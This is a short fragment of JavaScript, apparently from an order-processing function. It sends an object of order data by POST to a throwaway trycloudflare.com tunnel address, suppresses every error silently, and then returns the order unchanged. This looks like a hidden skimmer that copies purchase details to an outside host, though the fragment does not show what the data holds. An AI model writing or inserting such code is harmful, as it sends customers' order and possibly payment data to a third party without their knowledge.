...
fetch('https://soap-meant-greetings-workforce.trycloudflare.com/api/record-purchase',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(_mo)}).catch(function(){});}}catch(_me){}
return orderData;
